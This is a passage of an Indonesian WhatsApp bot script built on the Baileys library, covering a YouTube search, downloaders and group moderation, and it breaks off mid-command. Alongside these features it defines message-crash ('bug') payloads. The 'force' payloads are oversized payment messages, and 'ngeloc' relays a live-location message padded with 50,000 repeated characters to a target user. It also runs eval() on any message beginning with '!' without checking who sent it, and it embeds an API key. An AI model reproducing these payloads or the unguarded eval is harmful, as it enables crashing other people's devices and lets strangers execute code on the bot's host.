

// JANGAN SEBAR SCRIPT INI SECARA GRATIS
// © HAIKAL

// LATAR BELAKANG :
//INI MERUPAKAN RAKITAN SCRIPT ARTIFICIAL INTELEGENT MELALUI WHAT'SAPP CHAT BOT YANG DI KEMBANGKAN OLEH X-CODE, KAMI MENCIPTAKAN WHATSAPP CHAT BOT INI UNTUK MEMPERMUDAH MANUSIA DALAM MEMPEROLEH ATAU MENINGKATKAN PENGETAHUAN TAHUAN YANG LUAS TERHADAP ILMU TEKNOLOGI DI ZAMAN SEKARANG, MEMPERMUDAH DALAM MENCARI INFORMASI ATAU ADAPTASI TERHADAP PERKEMBANGAN TEKNOLOGI DI ZAMAN SEKARANG, MENGINGAT KECANGGIHAN TEKNOLOGI DI ZAMAN SEKARANG YANG SEMAKIN LAMA SEMAKIN PESAT, SCRIPT ADALAH SCRIPT ASLI KARYA ANAK NUSANTARA. MELALUI LIBRARY WA-WEB.JS MILIK @WHISKEYSOCKETS SEMAKIN MEMPERMUDAH KAMK DALAM MENGEMBANGKAN SCRIPT INI.JADI TOLONG GUNAKAN SRCIPT INI SEBIJAK MUNGKIN, SEKIAN

// BAB 1
//1. PENDAHULUAN
//.  KAMI SEGENAP PENGEMBANG SCRIPT INI SANGAT BERTERIMAKASIH KEPADA PARA SUPORTER, YABG SUDAH SELALU MENSUPPORT KITA SEJAUH INI, DAN SELALU MEMBERI SARAN UNTUK KITA KEDEPANNYA, DAN JUGA KEPADA PARA MEMBER X-CODE YANG SANGAT HEBAT DALAM MEMBANGUN SCRIPT INI SAMAPAI VERSI 4.0.


require('./pengaturan')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageContent, generateWAMessage, downloadContentFromMessage, areJidsSameUser, getContentType } = global.baileys
const { generateWAMessageFromContent, proto, prepareWAMessageMedia } = require("@whiskeysockets/baileys")
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const speed = require('performance-now')
const axios = require('axios')
const fsx = require('fs-extra')
const mark = `0@s.whatsapp.net`
const dns = require('dns');
const FormData = require('form-data')
const gtts = require('node-gtts')
const ytdl = require("ytdl-core")
const cheerio = require('cheerio');
const ms = require("ms");
const crypto = require('crypto')
const https = require('https')
const yts = require("yt-search")
const LINODE_API_TOKEN = global.apilinode;
const API_TOKEN = global.apitokendo;
const moment = require('moment-timezone') 
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, formatp, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const { exec, spawn, } = require("child_process")
const { toAudio, toPTT, toVideo, ffmpeg } = require('./lib/converter')

/*
╬╬═════════════╬╬╬╬═════════════╬╬╬╬═════════════╬╬
*/
const apikey = "66ff36bd2b59547b514c648d"
const thumb = "https://telegra.ph/file/e6e7d449e990e15d68ea9.jpg"
const grup = "https://chat.whatsapp.com/KLwRD2szGxT3FopuOIs5Wh"
const qris = "https://telegra.ph/file/0e08e8089aab1c39daa01.jpg"
const pengguna = JSON.parse(fs.readFileSync('./dbm/wihh.json'))
const prem = require("./lib/premium");
let premium = JSON.parse(fs.readFileSync('./dbm/premium.json'));
const xeonverifieduser = JSON.parse(fs.readFileSync('./dbm/wihh.json'))
const ntilink = JSON.parse(fs.readFileSync("./dbm/antilink.json"))
const banned = JSON.parse(fs.readFileSync('./dbm/banned.json'))
const { kalz1 } = require('./dbm/bug/kalz1')
const { kalz2 } = require('./dbm/bug/kalz2')
const { kalz3 } = require('./dbm/bug/kalz3')
const { kalz4 } = require('./dbm/bug/kalz4')
const { kalz5 } = require('./dbm/bug/kalz5')
const { kalz6 } = require('./dbm/bug/kalz6')
const bonekasnack = fs.readFileSync('./dbm/media/bonekasnack.jpg')
const manu = fs.readFileSync('./dbm/media/manu.jpg')
const uang = fs.readFileSync('./dbm/media/uang.jpg')
const snack = fs.readFileSync('./dbm/media/snack.jpg')
const edelweis = fs.readFileSync('./dbm/media/edelweis.jpg')
const galaxyrose = fs.readFileSync('./dbm/media/galaxyrose.jpg')
const helokity = fs.readFileSync('./dbm/media/helokity.jpg')
const minion = fs.readFileSync('./dbm/media/minion.jpg')
const mawar = fs.readFileSync('./dbm/media/mawar.jpg')
const mengkece = fs.readFileSync(`./ikal.jpg`)
const harga1 = "Rp.138,000"
const harga2 = "Rp.18,000"
const harga3 = "Rp.26,000"
const harga4 = "Rp.148,000"
const harga5 = "Rp.101,000"
const harga6 = "Rp.78,000"
const harga7 = "Rp.110,000"
const harga8 = "Rp.1K-50K"
const harga9 = "400K - 2JT"
const bd2 = "https://telegra.ph/file/0464df1ef472a9ac53aff.jpg"

const tanda = '➻'
/*
╬╬═════════════╬╬╬╬═════════════╬╬╬╬═════════════╬╬
*/
module.exports = kalz = async (kalz, m, chatUpdate, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'interactiveResponseMessage') ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.msg.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
/*
╬╬═════════════╬╬╬╬═════════════╬╬╬╬═════════════╬╬
*/
const Styles = (text, style = 1) => {
  var xStr = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
  var yStr = {
    1: 'abcdefghijklmnopqrstuvwxyz1234567890'
  };
  var replacer = [];
  xStr.map((v, i) =>
    replacer.push({
      original: v,
      convert: yStr[style].split('')[i]
    })
  );
  var str = text.toLowerCase().split('');
  var output = [];
  str.map((v) => {
    const find = replacer.find((x) => x.original == v);
    find ? output.push(find.convert) : output.push(v);
  });
  return output.join('');
};

const pushname = m.pushName || "No Name"

    
function getFormattedDate() {
  var currentDate = new Date();
  var day = currentDate.getDate();
  var month = currentDate.getMonth() + 1;
  var year = currentDate.getFullYear();
  var hours = currentDate.getHours();
  var minutes = currentDate.getMinutes();
  var seconds = currentDate.getSeconds();
}
/*
╬╬═════════════╬╬╬╬═════════════╬╬╬╬═════════════╬╬
*/
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''//Kalau mau Single prefix Lu ganti pake ini = const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
const botNumber = await kalz.decodeJid(kalz.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const text = q = args.join(" ")
const { type, quotedMsg, mentioned, now, fromMe } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
const groupMetadata = m.isGroup ? await kalz.groupMetadata(from).catch(e => {}) : ''
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const welcm = m.isGroup ? wlcm.includes(from) : true
const welcmm = m.isGroup ? wlcmm.includes(from) : true
const AntiLink = m.isGroup ? ntilink.includes(from) : true
const Jpm = m.isGroup ? ntilink.includes(from) : false 
const chat = m.isGroup?[m.chat] : false
const isBan = banned.includes(m.sender)
const isPrem = isCreator ? true : prem.checkPremiumUser(m.sender, premium)
const content = JSON.stringify(m.message)
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
//const Input = mentionByTag[0] ? mentionByTag[0] : q ? numberQuery : false
const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
if(time2 < "23:59:00"){
var stime = Styles(`Selamat Pagi 🌄`)
 }
 if(time2 < "19:00:00"){
var stime = Styles(`Selamat Malam 🌌`)
 }
 if(time2 < "18:00:00"){
var stime = Styles(`Selamat Malam 🌌`)
 }
 if(time2 < "15:00:00"){
var stime = Styles(`Selamat Sore 🌅`)
 }
 if(time2 < "11:00:00"){
var stime = Styles(`Selamat Pagi 🌄`)
 }
 if(time2 < "05:00:00"){
var stime = Styles(`Selamat Pagi 🌄`)
 }
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const tanggal2 = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')	
const qtod = m.quoted? "true":"false"
const bii = JSON.parse(fs.readFileSync('./dbm/wihh.json').toString())
const isSeler = [botNumber, ...bii].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const jangan = m.isGroup ? ntilink.includes(m.chat) : false	
let isNumber = x => typeof x === 'number' && !isNaN(x)
if (m?.isGroup && chat) {
if (!('welcome' in chat)) chat.welcome = true
if (!('sWelcome' in chat)) chat.sWelcome = ''
if (!isNumber(chat.cleartime)) chat.clearTime = 0
} else if (m?.isGroup) global.db.data.chats[m.chat] = {
sWelcome: '',
welcome: true,
clearTime: 0
}

/*
╬╬═════════════╬╬╬╬═════════════╬╬╬╬═════════════╬╬
*/
// FUNCTION

const ments = (teks) => {return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : [sender]}

const fcall = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: body}}}

const reply = async(teks) => {kalz.sendMessage(from, {text: teks, mentions: await ments(teks)},{quoted:fcall})}

kalz.autoshalat = kalz.autoshalat ? kalz.autoshalat : {}
	let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? kalz.user.id : m.sender
	let id = m.chat 
    if(id in kalz.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"  
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for(let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if(timeNow === waktu) {
    let caption = `Hai kak ${pushname},\nWaktu *${sholat}* telah tiba, Saat Berjamaah Di Masjid/Musholah Untuk Laki Laki dan Solat Di Rumah Untuk Perempuan.\n\n*${waktu}*\n_untuk wilayah Kota Bekasi dan sekitarnya._`
    kalz.autoshalat[id] = [
    reply(caption),
    setTimeout(async () => {
    delete kalz.autoshalat[m.chat]
    }, 57000)
    ]
    }
    }

const totalFitur = () =>{
            var mytext = fs.readFileSync("./X-code.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
      

async function dellCase(filePath, caseNameToRemove) {
    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan:', err);
            return;
        }

        const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
        const modifiedData = data.replace(regex, '');

        fs.writeFile(filePath, modifiedData, 'utf8', (err) => {
            if (err) {
                console.error('Terjadi kesalahan saat menulis file:', err);
                return;
            }

            console.log(`Teks dari case '${caseNameToRemove}' telah dihapus dari file.`);
        });
    });
}

const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await kalz.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: fcall })
fs.unlinkSync(mp3File)
})
} catch (err) {
reply(`${err}`)
}
}

async function igdl2(url) {
            let res = await axios("https://indown.io/");
            let _$ = cheerio.load(res.data);
            let referer = _$("input[name=referer]").val();
            let locale = _$("input[name=locale]").val();
            let _token = _$("input[name=_token]").val();
            let { data } = await axios.post(
              "https://indown.io/download",
              new URLSearchParams({
                link: url,
                referer,
                locale,
                _token,
              }),
              {
                headers: {
                  cookie: res.headers["set-cookie"].join("; "),
                },
              }
            );
            let $ = cheerio.load(data);
            let result = [];
            let __$ = cheerio.load($("#result").html());
            __$("video").each(function () {
              let $$ = $(this);
              result.push({
                type: "video",
                thumbnail: $$.attr("poster"),
                url: $$.find("source").attr("src"),
              });
            });
            __$("img").each(function () {
              let $$ = $(this);
              result.push({
                type: "image",
                url: $$.attr("src"),
              });
            });
          
            return result;
          }
//==================================================//
if (!kalz.public) {
if (!m.key.fromMe) return
}
let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
kalz.sendPresenceUpdate('available', m.chat)
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m Kalzx BOT \x1b[1;37m]', time, chalk.green(budy || m.mtype), 'Dari', chalk.blue(pushname), 'Di', chalk.yellow(groupName ? groupName : 'Private Chat' ), 'args :', chalk.white(args.length))
            }
            
            const qdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: `Powered By ${global.ownername}`, jpegThumbnail: ""}}}
           

     
// Anti Link

if (AntiLink) {
if (body.match(/(chat.whatsapp.com\/)/gi)) {
if (!isBotAdmins) return reply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
let gclink = (`https://chat.whatsapp.com/`+await kalz.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return kalz.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return kalz.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isCreator) return kalz.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\Owner telah mengirim link, owner bebas memposting link apa pun`})
await kalz.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
kalz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
kalz.sendMessage(from, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan kirim group link di group ini`, contextInfo:{mentionedJid:[sender]}}, {quoted:m})
}
}
function pickRandom(list) {
    return list[Math.floor(list.length * Math.random())]
}
//=================================================//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: kalz.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, kalz.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
kalz.ev.emit('messages.upsert', msg)
}
//=================================================//
if (budy.startsWith('!')) {
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
//==================================================//
try {
ppuser = await kalz.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
try {

let limitUser = global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
} catch (err) {
console.log(err)
} 

let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
                if (!isNumber(setting.status)) setting.status = 0
                if (autobio) {
        let _uptime = process.uptime() * 1000
		let uptime = clockString(_uptime)
		await kalz.updateProfileStatus(`${botname} | Aktif Selama ${uptime} ⏰ | Mode : ${kalz.public ? 'Public-Mode' : 'Self-Mode'}`).catch(_ => _)
        }
if (autoread) {
kalz.readMessages([m.key])
        }
            } else global.db.data.settings[botNumber] = {
                status: 0,
                autobio: false,
                autoread: false
            }

let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
reply(`Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}
if (global.db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
reply(`
Telah Kembali Dari Afk ${user.afkReason ? ' Selama ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

function pickMoji(list) {
     return list[Math.floor(Math.random() * list.length)]
  }

async function falseR () {
kalz.sendReact(m.chat, '❌', m.key)
}

async function loading () {
var kalzx = [ 
 'Tunggu Sebentar 😉 .',
 'Tunggu Sebentar 😉 . .',
  'Tunggu Sebentar 😉 . . .',
  'Tunggu Sebentar 😉 .',
 'Tunggu Sebentar 😉 . .',
  'Tunggu Sebentar 😉 . . .',
 `Sukses ✔️`
 ]
let { key } = await kalz.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})//Pengalih isu

for (let i = 0; i < kalzx.length; i++) {
/*await delay(10)*/
await kalz.sendMessage(from, {text: kalzx[i], edit: key });//PESAN LEPAS
}
}

async function kalzdown(kalzx,chat) {
kalz.sendMessage(chat, {
document: {url: './settings.js'},
mimetype: `image/null`,
fileName: `${kalzx}.${zawn1}` ,
caption: `${kalzx+ zawn1}`,
}, {quoted: m })
}

const tanda = '➻'

const qevent = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
'message': {
  "eventMessage": {
    "isCanceled": false,
    "name": "X-Code 🌐",    
    "description": "Hello World",
    "location": {
      "degreesLatitude": 0,
      "degreesLongitude": 0,
      "name": "Apakajajanabs"
    },
    "joinLink": "https://call.whatsapp.com/video/hMwVijMQtUb0qBJL3lf0rv",
    "startTime": "1713724680"
  }
}
}

const qpayment = {
key: {
remoteJid: '0@s.whatsapp.net',
fromMe: false,
id: `ownername`,
participant: '0@s.whatsapp.net'
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: "USD",
amount1000: 999999999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: botname
}},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: "INR"
}}}}


const sirbug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `Kalzxcode`
}
}
}

const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./ikal.jpg`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./ikal.jpg`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}


async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await kalz.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}


async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await kalz.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

const kalzxy = "https://telegra.ph/file/bfaa6f9d8f7710fe503ec.jpg"
async function kalzx(teks) {
return kalz.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnailUrl: kalzxy, title: "SYSTEM NOTIFICATION ❗", body: "© Powered By "+botname, previewType: "PHOTO"}}}, {quoted: m})
}
async function replay(teks) {
return kalz.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnailUrl: thumb, title: "SILAKAN TUNGGU 🔥", body: "© Powered By "+botname, previewType: "PHOTO"}}}, {quoted: m})
}
async function replayy(teks) {
return kalz.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnailUrl: thumb, title: "X-CODE V4.0", body: "© Powered By "+botname, previewType: "PHOTO"}}}, {quoted: m})
}
class Ytdl {
    constructor() {
        this.baseUrl = 'https://id-y2mate.com';
    }

    async search(url) {
        const requestData = new URLSearchParams({
            k_query: url,
            k_page: 'home',
            hl: '',
            q_auto: '0'
        });

        const requestHeaders = {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept': '*/*',
            'X-Requested-With': 'XMLHttpRequest'
        };

        try {
            const response = await axios.post(`${this.baseUrl}/mates/analyzeV2/ajax`, requestData, {
                headers: requestHeaders
            });

            const responseData = response.data;
            console.log(responseData);
            return responseData;
        } catch (error) {
            if (error.response) {
                console.error(`HTTP error! status: ${error.response.status}`);
            } else {
                console.error('Axios error: ', error.message);
            }
        }
    }

    async convert(videoId, key) {
        const requestData = new URLSearchParams({
            vid: videoId,
            k: key
        });

        const requestHeaders = {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept': '*/*',
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
            'Referer': `${this.baseUrl}/youtube/${videoId}`
        };

        try {
            const response = await axios.post(`${this.baseUrl}/mates/convertV2/index`, requestData, {
                headers: requestHeaders
            });

            const responseData = response.data;
            console.log(responseData);
            return responseData;
        } catch (error) {
            if (error.response) {
                console.error(`HTTP error! status: ${error.response.status}`);
            } else {
                console.error('Axios error: ', error.message);
            }
        }
    }

    async play(url) {
        let {
            links,
            vid,
            title
        } = await this.search(url);
        let video = {},
            audio = {};

        for (let i in links.mp4) {
            let input = links.mp4[i];
            let {
                fquality,
                dlink
            } = await this.convert(vid, input.k);
            video[fquality] = {
                size: input.q,
                url: dlink
            };
        }

        for (let i in links.mp3) {
            let input = links.mp3[i];
            let {
                fquality,
                dlink
            } = await this.convert(vid, input.k);
            audio[fquality] = {
                size: input.q,
                url: dlink
            };
        }

        return {
            title,
            video,
            audio
        };
    }
}

const downloadMp4 = async (Link) => {
try {
await Ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = Ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await kalz.sendMessage(from, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: fcall })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
}

//BATAS
//==================================================//
switch(command) {

case "yts":{
await loading()
if (!text) return reply(`Example : ${prefix + command} Lagu sad`)
let search = await yts(`${text}`)
let data = await search.all.filter((v) => v.type == 'video')
try {
var res12 = data[0]
} catch {
var res12 = data[1]
}
wek = `
Berikut adalah hasil pencarian dari Bot
`
let sections = [{
title: 'List Hasil Pencarian',
highlight_label: '© Youtube',
rows: [
{
title: `${search.all[0].title}`,
description: `${search.all[0].title}`, 
id: `.play ${search.all[0].title}`
}, 
{
title: ` ${search.all[2].title}`,
description: `${search.all[2].title}`, 
id: `.play ${search.all[2].title}`
},
{
title: ` ${search.all[3].title}`,
description: `${search.all[3].title}`, 
id: `.play ${search.all[3].title}`
},
{
title: ` ${search.all[4].title}`,
description: `${search.all[4].title}`, 
id: `.play ${search.all[4].title}`
},
{
